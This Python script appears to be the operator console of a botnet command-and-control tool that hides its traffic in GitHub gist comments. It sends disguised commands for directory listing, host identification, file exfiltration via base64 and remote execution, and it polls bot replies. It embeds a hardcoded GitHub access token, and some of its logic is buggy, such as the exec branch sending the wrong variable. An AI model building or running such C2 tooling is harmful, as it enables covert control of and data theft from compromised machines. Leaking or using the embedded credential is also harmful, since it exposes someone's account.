import requests as rq
from datetime import datetime, timedelta
import sys
import signal
from threading import Thread, Event
import time
import json
import subprocess

TIMEOUT = 60 #heartbeat interval

URL = "https://api.github.com/gists/d3639f5c1e928cf7b6570929a075eb4c/comments"
ACCESS_TOKEN = "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"

greetings = ["Hello.👋", "Hi. 👋", "What's up 👋", "Ciao 👋"]
headers = {
    "Accept": "application/vnd.github+json",
    "Authorization": "Bearer "+ACCESS_TOKEN
}

def checkBots(id, stop):
    timestamp = datetime.now()
    idx = 0
    while True:
        if stop():
            break

        x = rq.get(URL)
        if x.status_code == 200:
            x = x.json()
            for comment in x:
                body = comment["body"]
                #from GMT0 to GMT+1
                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ') + timedelta(hours=1)
                if timestamp < dt: #new comment
                    if "👀" in body:
                        print(body.split()[4])
        else:
            print(x.json())
        print("Heartbeating bots...")
        timestamp = datetime.now()
        data = {
            "body": greetings[idx]
        }
        r = rq.patch(URL+"/4422313", headers=headers, data=json.dumps(data))
        print(r)
        idx = idx + 1
        if idx > 3:
            idx = 0
        time.sleep(TIMEOUT)

stop_threads = False

t1 = Thread(target=checkBots, args=(id, lambda: stop_threads))
t1.start()

threads = []

def copyHandler(id, stop, filename):
    timestamp = datetime.now()
    idx = 0
    while True:
        if stop():
            break
        x = rq.get(URL)
        if x.status_code == 200:
            x = x.json()
            for comment in x:
                body = comment["body"]
                #from GMT0 to GMT+1
                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ') + timedelta(hours=1)
                if timestamp < dt: #new comment
                    if filename in body:
                        id = comment["id"]
                        start = body.find("<!--")+5+len(filename)+1
                        end = body.find("-->")-1
                        encoded = body[start:end]
                        name = "foo"
                        if filename.rfind("/") != -1:
                            name = filename[(filename.rfind("/")+1):]
                        else:
                            name = filename
                        subprocess.run(["base64", "--decode", encoded, ">", name])
                        break


def post(body):
    r = rq.post(URL, headers=headers, data=json.dumps(body))
    print(r)

while True:
    s = input()
    #print("You wrote: " + s)
    if s == "exit":
        print("Exiting...")
        stop_threads = True
        break
    elif s == "w":
        post({"body": "Where are the droids? 🥳"})
    elif s == "ls":
        print("Input path: ")
        path = input()
        post({"body": "Where are the droids? 🤓 <!--" + path + "-->"})
    elif s == "id":
        post({"body": "Mesa called Jar Jar Binks, mesa your humble servant! 🫵"})
    elif s == "copy":
        print("write filename: ")
        filename = input()
        post({"body": "Release him! 🤯 <!--" + filename + "-->"})
        t = Thread(target=copyHandler, args=(id, lambda: stop_threads, filename))
        t.start()
        threads.append(t)
    elif s == "exec":
        print("write path: ")
        path = input()
        post({"body": "Let the past die 😵‍💫 <!--" + filename + "-->"})
    else:
        print("Invalid command. (w, ls, id, copy, exec, exit)")

stop_threads = True
t1.join() 
for t in threads:
    t.join()